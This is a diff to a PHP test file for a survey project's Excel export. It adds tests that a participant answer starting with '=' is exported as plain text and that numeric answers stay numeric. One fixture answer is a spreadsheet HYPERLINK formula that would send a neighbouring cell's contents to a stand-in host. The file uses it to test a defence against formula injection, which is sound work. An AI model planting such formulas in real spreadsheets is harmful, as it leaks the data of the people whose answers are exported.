@@ -10,7 +10,11 @@ use App\Mart\MartProject;
 use App\Mart\MartQuestion;
 use App\Mart\MartSchedule;
 use App\Mart\MartStat;
+use App\User;
 use Maatwebsite\Excel\Facades\Excel;
+use PhpOffice\PhpSpreadsheet\Cell\DataType;
+use PhpOffice\PhpSpreadsheet\IOFactory;
+use PhpOffice\PhpSpreadsheet\Spreadsheet;
 use Tests\TestCase;
 
 class MartExportTest extends TestCase
@@ -131,7 +135,7 @@ class MartExportTest extends TestCase
         $export = new MartProjectExport($this->project);
         $sheets = $export->sheets();
 
-        $this->assertCount(4, $sheets, 'Export should have 4 sheets');
+        $this->assertCount(5, $sheets, 'Export should have 5 sheets');
 
         // Test entries sheet
         $entriesSheet = $sheets[0];
@@ -147,6 +151,93 @@ class MartExportTest extends TestCase
         $this->assertEquals('TEST_PARTICIPANT', $row[0]);
         $this->assertEquals('7', $row[7]); // First question answer
         $this->assertEquals('Work, Exercise', $row[8]); // Multiple choice joined
+    }
+
+    /** @test */
+    public function a_typed_answer_starting_with_an_equals_sign_stays_text_in_the_file()
+    {
+        // A participant could type a formula, e.g. a HYPERLINK that sends
+        // other cells away when the researcher clicks it.
+        $question = MartQuestion::create([
+            'schedule_id' => $this->schedule->id,
+            'position' => 1,
+            'text' => 'Describe today in one word.',
+            'type' => 'text',
+            'config' => [],
+            'is_mandatory' => true,
+            'version' => 1,
+        ]);
+        $entry = MartEntry::create([
+            'schedule_id' => $this->schedule->id,
+            'questionnaire_id' => 1,
+            'main_entry_id' => 0,
+            'participant_id' => 'TEST_PARTICIPANT',
+            'user_id' => 'test@example.com',
+            'started_at' => now()->subMinutes(5),
+            'completed_at' => now(),
+            'duration_ms' => 300000,
+            'timezone' => 'Europe/Berlin',
+            'timestamp' => now()->timestamp,
+        ]);
+        MartAnswer::create([
+            'entry_id' => $entry->id,
+            'question_uuid' => $question->uuid,
+            'question_version' => 1,
+            'answer_value' => json_encode(['=HYPERLINK("https://example.test/?"&A2,"Open")']),
+        ]);
+
+        $answerCell = $this->exportedWorkbook()->getSheetByName('Questionnaire Responses')->getCell('H2');
+
+        $this->assertSame(DataType::TYPE_STRING, $answerCell->getDataType());
+    }
+
+    /** @test */
+    public function an_answer_number_stays_a_number_in_the_file()
+    {
+        $question = MartQuestion::create([
+            'schedule_id' => $this->schedule->id,
+            'position' => 1,
+            'text' => 'Hours of sleep',
+            'type' => 'number',
+            'config' => [],
+            'is_mandatory' => true,
+            'version' => 1,
+        ]);
+        $entry = MartEntry::create([
+            'schedule_id' => $this->schedule->id,
+            'questionnaire_id' => 1,
+            'main_entry_id' => 0,
+            'participant_id' => 'TEST_PARTICIPANT',
+            'user_id' => 'test@example.com',
+            'started_at' => now()->subMinutes(5),
+            'completed_at' => now(),
+            'duration_ms' => 300000,
+            'timezone' => 'Europe/Berlin',
+            'timestamp' => now()->timestamp,
+        ]);
+        MartAnswer::create([
+            'entry_id' => $entry->id,
+            'question_uuid' => $question->uuid,
+            'question_version' => 1,
+            'answer_value' => json_encode([7]),
+        ]);
+
+        $answerCell = $this->exportedWorkbook()->getSheetByName('Questionnaire Responses')->getCell('H2');
+
+        $this->assertSame(DataType::TYPE_NUMERIC, $answerCell->getDataType());
+    }
+
+    /** The export as the researcher's spreadsheet program reads it. */
+    private function exportedWorkbook(): Spreadsheet
+    {
+        $path = tempnam(sys_get_temp_dir(), 'mart-export') . '.xlsx';
+        file_put_contents($path, Excel::raw(new MartProjectExport($this->project), \Maatwebsite\Excel\Excel::XLSX));
+
+        try {
+            return IOFactory::load($path);
+        } finally {
+            unlink($path);
+        }
     }
 
     /** @test */
@@ -263,7 +354,7 @@ class MartExportTest extends TestCase
     /** @test */
     public function it_denies_export_to_non_owner()
     {
-        $otherUser = \App\User::factory()->researcher()->create();
+        $otherUser = User::factory()->researcher()->create();
 
         $this->actingAs($otherUser)
             ->get("/projects/{$this->project->id}/export")
